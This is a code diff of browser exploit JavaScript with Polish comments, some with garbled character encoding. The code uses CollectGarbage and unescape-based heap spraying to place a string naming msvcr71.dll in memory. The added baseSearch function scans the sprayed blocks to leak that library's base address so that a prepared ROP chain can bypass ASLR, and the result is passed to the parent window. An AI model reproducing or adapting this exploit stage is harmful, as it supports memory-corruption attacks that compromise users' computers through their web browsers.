@@ -16,7 +16,7 @@ function heaps() {
 
   CollectGarbage();
 
-  var code = unescape('%u0a3c%u0a0a') + //shity 
+  var code = unescape('%udddd%udddd') + //shity 
              'ms'+                      //moglibysmy zaladowaæ do pamiêci w³aœciwie dowoln¹ biblioteke 
              'vc'+                      //poniewa¿ zapisujemy adres bazowy w jednym z bloków pamiêci które kontrolujemy
              'r7'+                      //ale dla msvcr71 jest ju¿ gotowy ropChain, wiêc nie bêdziemy sie ju¿ bardziej torturowac
@@ -25,8 +25,8 @@ function heaps() {
              'l' + 
              unescape('%u0000')       +
              unescape('%u0a4c%u0a0a') + //[ebp + 8] - pointer to unicode string msvcr71.dll 
-             unescape('%ubaba%ueeee') +
-             unescape('%u0a38%u0a0a') +   
+             unescape('%ueeee%ueeee') +
+             unescape('%ucccc%ucccc') +   
              unescape('%ufefe%ufefe');  
 
     while (code.length < 100000)
@@ -60,7 +60,25 @@ function baseSearch() {   /* w ktoryms z bloków jest base adres, musimy go jakos
 								   "msvcr71.dll" i nic poza tym we wzorcu pamiêci i to powinno wystarczyæ, jeœli nie 
 								   mo¿emy znaleŸæ offset wzglêdem pierwszego bloku poniewa¿ wszystkie one do siebie idealnie przylegaj¹,
 								   zreszt¹ orginalny layout mamy w zmiennej "block".*/
-              //alert(escape(mem[i].toString(16)));
+            if( escape(block.toString(16)) != escape(mem[i].toString(16)) ) {
+
+              var x  = 0;   
+              memstr = escape(mem[i].toString(16)).split('%u');
+              bstr   = escape(block.toString(16)).split('%u');
+
+              for(j=0; j<memstr.length; j++) {   //index 115069 
+
+                  if(memstr[j] != bstr[j]) { 
+
+                      if(x == 11) {
+                         base = memstr[j];
+                         return base;
+                      }
+                      x++;
+                  }
+              }
+              
+           } 
                
        }
       
@@ -70,6 +88,8 @@ function baseSearch() {   /* w ktoryms z bloków jest base adres, musimy go jakos
 function msg() {  /* w tym momencie mamy base adres biblioteki w pamieci */
 
    baseOf = baseSearch();
+   
+   alert('0x'+baseOf+'0000'); 
    
    parent.window.baseDll = baseOf;  /* zapiszmy go w oknie nadrzêdnym */
 
